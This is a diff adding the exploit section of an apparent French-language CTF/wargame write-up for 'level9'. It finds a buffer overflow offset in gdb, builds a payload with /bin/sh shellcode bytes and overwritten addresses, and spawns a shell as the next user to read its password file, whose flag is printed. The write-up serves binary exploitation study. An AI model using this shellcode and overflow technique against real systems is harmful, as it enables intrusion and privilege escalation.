@@ -244,3 +244,68 @@
       - return (this->value - other.value)<br/><br/>
 
 ## Exploit
+
+Comme on l'a vu dans l'analyse, notre programme SegFault avec un argument trop long, trouvons son [offset](https://wiremask.eu/tools/buffer-overflow-pattern-generator/):
+
+- `gdb level9`
+  - `set disassembly-flavor intel`
+  - `r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
+    ```
+    [...]
+      Program received signal SIGSEGV, Segmentation fault.
+        0x08048682 in main ()
+    [...]
+    ```
+    - Le main SegFault à l'instruction <main +142>, où on essaie de déréférencer eax pour y mettre le contenu à l'adresse qu'il contient dans edx, juste avant de le call à <main +159>
+  - `info registers`
+    ```asm
+    [...]
+      eax            0x41366441	1094083649
+    [...]
+    ```
+    - eax a été réécrit par notre payload, le générateur de pattern nous indique un offset de 108 pour 0x41366441 
+
+Étant donné qu'il n'y a pas de call a "/bin/sh" dans le programme, on va devoir utiliser un shellcode. L'objectif ici va être d'insérer un pointeur sur son adresse dans eax, afin qu'elle soit déréférencée puis stockée dans edx avant d'être call.
+
+Pour cela, on va poser un breakpoint à l'instruction qui SegFault: 0x08048682 et observer l'évolution de $eax avec un pattern adapté a notre buffer:
+  - `b * 0x08048682`
+  - `r $(python -c 'print "A" * 108 + "BBBB"')`
+  - `x $eax`
+    ```
+    0x42424242:	Cannot access memory at address 0x42424242
+    ```
+    - Nos 4 B ont bien réécrit l'adresse dans eax, mais la suite va SegFault car 0x42424242 n'est pas une adresse valide.
+
+L'idée ici sera de mettre l'adresse de notre input dans eax, notre input sera alors construit comme suit:
+- L'adresse de notre shellcode (4 octets) => adresse de notre input + 4
+- [Notre shellCode](https://www.exploit-db.com/exploits/42428) (24 octets)
+- Padding de (108 - 4 - 24 = 80 octets)
+- L'adresse de notre input
+Ainsi, eax va porter l'adresse de notre input. Lors du déréférencement, le programme va y lire les 4 premiers octets (l'adresse de notre shellcode un plus loin dans l'input) et les stocker en tant qu'adresse dans edx, pour enfin être call à <main +159>. C'est cool, mais pour cela il nous faut l'adresse de notre input ! <br/>
+
+On pose un breakpoint juste avant que eax ne soit réécrit avec notre input:
+  - `breakpoint * 0x0804867c`
+  - `r AAAA`
+  - `x $eax`
+    ```asm
+    0x804a00c:	0x41414141
+    ```
+    - l'adresse de notre input est donc 0x804a00c.
+
+On construit donc notre payload avec le format expliqué ci-dessus:
+- '\x10\xa0\x04\x08' => &input + 4 en little endian
+- "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" => shellcode
+- "A" * 80
+- '\x0c\xa0\x04\x08'
+
+-`./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08"')`
+  ```
+  ```
+  - `whoami`
+    ```
+    bonus0
+    ```
+  - `cat /home/user/bonus0/.pass`
+    ```
+    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+    ```
